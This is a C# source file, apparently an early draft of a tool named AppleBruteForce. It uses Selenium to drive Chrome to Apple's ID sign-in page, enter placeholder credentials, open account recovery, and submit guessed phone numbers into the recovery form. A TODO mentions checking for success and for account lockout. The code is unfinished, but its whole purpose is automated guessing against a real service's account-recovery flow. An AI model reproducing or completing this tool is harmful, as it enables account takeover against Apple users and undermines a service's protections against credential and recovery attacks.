using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Remote;


namespace AppleBruteForce
{
    public class Engine
    {
        private IWebElement GetControlById(RemoteWebDriver driver, string id)
        {
            var xpath = $@".//*[@id=""{id}""]";
            return driver.FindElementsByXPath(xpath).FirstOrDefault();
        }

        public RemoteWebDriver CreateDriver()
        {
            return new ChromeDriver();
        }

        public void SetupDriver(RemoteWebDriver driver)
        {
            //var allXpath = @".//*";
            //var allControls = driver.FindElementsByXPath(allXpath);
            //var tags = allControls.Select(c => c.TagName).ToArray();
            //var texts = allControls.Select(c => c.Text).ToArray();

            var appleId = "foobar@gmail.com";
            var pwd = "foobar";

            driver.Url = "https://appleid.apple.com/#!&page=signin";
            driver.SwitchTo().Frame(0);

            Sleep();

            var idControl = GetControlById(driver, "appleId");
            idControl.SendKeys(appleId);

            var pwdControl = GetControlById(driver, "pwd");
            pwdControl.SendKeys(pwd);

            var button = GetControlById(driver, "sign-in");
            button.Click();

            Sleep();

            var ntdpLInk = GetControlById(driver, "no-trstd-device-pop");
            ntdpLInk.Click();

            Sleep();

            var needHelp = GetControlById(driver, "need-help-link");
            needHelp.Click();

            Sleep();

            var recovery = GetControlById(driver, "acc-recovery");
            recovery.Click();

            var tabs = driver.WindowHandles.ToArray();
            driver.SwitchTo().Window(tabs[1]);
        }


        public bool TryThis(RemoteWebDriver driver, string phoneNumber)
        {
            var phoneNumberInput = GetControlById(driver, "phoneNumber");
            phoneNumberInput.SendKeys(phoneNumber);

            var continueButton = GetControlById(driver, "action");
            continueButton.Click();

            return false; // TODO validate success, think about timeouts, capture account it locked.
        }

        //private void WriteOutControls(IEnumerable<IWebElement> elements, string elementId)
        //{
        //    var ids =
        //    elements.ToArray()
        //        .Where(el => B(el, elementId))
        //        .Select(el => el.GetAttribute(elementId));

        //    foreach (var id in ids)
        //    {
        //        Debug.WriteLine(id);
        //    }
        //}

        private static void Sleep()
        {
            System.Threading.Thread.Sleep(1000);
        }


        private static bool B(IWebElement el, string elementId)
        {
            {
                bool returnThis = false;
                try
                {
                    returnThis = !String.IsNullOrEmpty(el.GetAttribute(elementId));
                }
                catch{}
                return returnThis;
            }
        }
    }

    //var IdControl = chrome.FindElementByXPath(xxx);
    //var xxx = @"[@id=""aid-auth-widget-iFrame""]";
    //auth - widget - container
    //var xxx = @".//*[@TagName=""input""]";
    //var allControls = chrome.FindElementsByName()
    //var appleIdControl = chrome.FindElement(By.XPath(xxx));
    //var username = appleIdControl[342].Text;
    //var elementId = "id";
    //var tags = allControls.Select(c => c.TagName).ToArray();
    //var elementId = "class";
    //WriteOutControls(allControls, elementId);
}
